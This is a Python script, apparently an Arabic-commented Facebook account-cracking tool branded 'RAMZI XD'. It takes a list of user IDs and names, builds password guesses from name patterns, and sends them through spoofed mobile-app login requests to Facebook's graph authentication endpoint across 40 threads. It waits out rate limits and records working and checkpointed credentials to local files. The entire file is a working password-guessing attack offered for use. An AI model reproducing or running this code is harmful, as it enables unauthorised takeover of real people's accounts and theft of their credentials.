import os, sys, time, json, random, re, string, uuid, base64
from concurrent.futures import ThreadPoolExecutor as tred
import requests

# الألوان المميزة
G = '\033[1;32m' # أخضر
W = '\033[1;37m' # أبيض
R = '\033[1;31m' # أحمر
Y = '\033[1;33m' # أصفر

loop = 0
oks = []
cps = []

def logo():
    os.system('clear')
    print(f"""
{G} d8888b.  .d8b.  .88b  d88. d88888b d888888b 
{G} 88  `8D d8' `8b 88'YbdP`88 VP   AD   `88'   
{W} 88oobY' 88ooo88 88  88  88    ooo88    88    
{W} 88`8b   88~~~88 88  88  88    ~~~88    88    
{R} 88 `88. 88   88 88  88  88 db   adD   .88.   
{R} 88   YD YP   YP YP  YP  YP V88888P  Y888888P 
{Y}─────────────────────────────────────────────
{W} [+] VERSION : {G}2026.V3 (ULTRA)
{W} [+] POWER   : {G}MAXIMUM (API V19.0)
{W} [+] OWNER   : {R}RAMZI XD
{Y}─────────────────────────────────────────────""")

# ميثود توليد الـ User-Agent الأحدث لعام 2026
def get_ua():
    # محاكاة أحدث أجهزة الأندرويد لضمان الصيد
    android_version = random.choice(['12', '13', '14', '15'])
    fb_version = f"{random.randint(400, 480)}.0.0.{random.randint(10, 99)}"
    fb_bv = str(random.randint(500000000, 600000000))
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; SM-S928B Build/UP1A.{random.randint(210000, 299999)}.011) [FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_bv};FBDM/{{density=3.0,width=1080,height=2340}};FBLC/fr_DZ;FBRV/0;FBCR/Mobilis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S24Ultra;FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua

def crack_method(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r{W}[{G}RAMZI-XD{W}] {loop}|{G}OK:{len(oks)}{W}|{R}CP:{len(cps)}{W} ')
    sys.stdout.flush()
    
    fn = names.split(' ')[0].lower()
    try: ln = names.split(' ')[1].lower()
    except: ln = fn

    for pw in passlist:
        pas = pw.replace('first', fn).replace('last', ln).replace('First', fn.capitalize()).replace('Last', ln.capitalize())
        
        # هيدرز مسحوبة من آخر تحديث لتطبيق فيسبوك لايت 2026
        headers = {
            'User-Agent': get_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Quality': 'EXCELLENT',
            'X-FB-Connection-Type': 'WIFI',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }

        data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "email": ids,
            "password": pas,
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "source": "login",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_machine_id": "1",
            "meta_inf_fbmeta": "",
            "fb_api_req_friendly_name": "authenticate",
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        }

        try:
            # استخدام الرابط المباشر للـ b-graph لسرعة التجاوب
            url = 'https://b-graph.facebook.com/auth/login'
            res = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in res:
                print(f'\r\r{G}[RAMZI-OK] {ids} | {pas} ')
                oks.append(ids)
                with open('/sdcard/RAMZI_V3_OK.txt', 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                # print(f'\r\r{Y}[RAMZI-CP] {ids} | {pas} ')
                cps.append(ids)
                with open('/sdcard/RAMZI_V3_CP.txt', 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                break
            elif 'Calls to this api have exceeded the rate limit' in str(res):
                time.sleep(10) # حماية في حال كثرة الطلبات
        except:
            pass
            
    loop += 1

def ramzi_start():
    logo()
    print(f" {G}[1] CRACK FILE (LAST UPDATE 2026)")
    print(f" {G}[0] EXIT")
    opt = input(f"\n {W}Choice : ")
    
    if opt == '1':
        logo()
        file_path = input(f" {W}[+] ENTER FILE PATH: ")
        try:
            data_file = open(file_path, 'r').read().splitlines()
        except FileNotFoundError:
            print(f" {R}File not found! Try /sdcard/zxd.txt"); time.sleep(2); ramzi_start()
        
        # قائمة التخمين المحدثة اللي طلبتها
        plist = [
            'firstlast', 'first last', 'firstfirst', 'first first', 
            'lastlast', 'last last', 'first123', 'first1234', 
            'first12345', 'first123456', 'first123456789', 
            'first2006', 'first2007', 'first2005'
        ]
        
        logo()
        print(f" {Y}LOADED: {len(data_file)} IDS")
        print(f" {G}ATTACK STARTED (AIRPLANE MODE RECOMMENDED)")
        print("-" * 45)
        
        # استخدام 40 Thread لسرعة قصوى
        with tred(max_workers=40) as engine:
            for line in data_file:
                try:
                    uid, name = line.split('|')
                    engine.submit(crack_method, uid, name, plist)
                except: pass
        
        print(f"\n\n {G}DONE. OK: {len(oks)} | CP: {len(cps)}")
        input(" Press Enter...")
        ramzi_start()

if __name__ == "__main__":
    ramzi_start()